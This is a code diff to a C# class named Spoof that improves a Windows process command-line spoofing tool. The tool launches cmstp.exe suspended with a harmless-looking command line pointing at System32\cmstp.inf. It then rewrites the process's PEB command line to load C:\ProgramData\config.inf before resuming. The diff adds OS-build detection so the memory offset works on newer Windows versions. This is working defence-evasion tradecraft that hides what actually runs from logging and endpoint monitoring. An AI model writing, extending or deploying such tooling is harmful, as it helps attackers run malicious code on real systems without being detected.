@@ -26,6 +26,26 @@ public static class Spoof
         int cb,
         out int returnLength);
 
+    [DllImport("ntdll.dll")]
+    private static extern int RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInfo);
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct OSVERSIONINFOEXW
+    {
+        public uint dwOSVersionInfoSize;
+        public uint dwMajorVersion;
+        public uint dwMinorVersion;
+        public uint dwBuildNumber;
+        public uint dwPlatformId;
+        [MarshalAs(UnmanagedType.LPWStr)]
+        public string szCSDVersion;
+        public ushort wServicePackMajor;
+        public ushort wServicePackMinor;
+        public ushort wSuiteMask;
+        public byte wProductType;
+        public byte wReserved;
+    }
+
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool ReadProcessMemory(
         IntPtr hProcess,
@@ -94,7 +114,7 @@ public static class Spoof
         public IntPtr InheritedFromUniqueProcessId;
     }
 
-    private const int CommandLineOffset = 0x70;
+    private const int CommandLineOffsetFallback = 0x70;
 
     private static void Log(string msg)
     {
@@ -111,6 +131,12 @@ public static class Spoof
     {
         string spoofedCmd = "cmstp.exe /s C:\\Windows\\System32\\cmstp.inf";
         string realCmd = "cmstp.exe /s C:\\ProgramData\\config.inf";
+
+        OSVERSIONINFOEXW osvi = new OSVERSIONINFOEXW();
+        osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
+        RtlGetVersion(ref osvi);
+        int commandLineOffset = osvi.dwBuildNumber >= 22621 ? 0x80 : CommandLineOffsetFallback;
+        Log("[+] OS build " + osvi.dwBuildNumber + " → CommandLineOffset = 0x" + commandLineOffset.ToString("x"));
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
@@ -157,7 +183,7 @@ public static class Spoof
         IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuffer, ppOffset);
 
         byte[] cmdBuffer = new byte[16];
-        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
+        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, commandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
         {
             Log("[-] ReadProcessMemory(cmdPtr) FAILED");
             ResumeThread(pi.hThread);
@@ -185,7 +211,7 @@ public static class Spoof
         byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         Buffer.BlockCopy(lengthBytes, 0, cmdBuffer, 0, 2);
         Buffer.BlockCopy(maxLengthBytes, 0, cmdBuffer, 2, 2);
-        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
+        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, commandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
         Log("[+] Command line length updated");
 
         Log("[*] Resuming cmstp.exe thread...");
